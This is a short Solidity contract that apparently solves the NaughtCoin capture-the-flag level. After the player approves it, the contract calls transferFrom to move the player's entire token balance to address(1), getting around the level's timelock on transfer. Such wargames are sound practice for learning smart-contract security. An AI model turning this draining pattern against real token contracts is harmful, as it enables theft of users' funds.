// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/NaughtCoin.sol";

contract DrainNaughtCoin {
    NaughtCoin public naughtCoin;
    
    constructor(address _naughtCoin) {
        naughtCoin = NaughtCoin(_naughtCoin);
    }
    
    // Step 1: Player must first call naughtCoin.approve(address(this), balance)
    // Step 2: Then call this function to drain the tokens
    function drainAllTokens() external {
        address player = naughtCoin.player();
        uint256 balance = naughtCoin.balanceOf(player);
        
        // Use transferFrom to bypass the timelock
        naughtCoin.transferFrom(player, address(1), balance);
    }
    
    function step1_getApproveData(uint256 amount) external view returns (bytes memory) {
        // Helper to get the approve function call data
        return abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
    }
}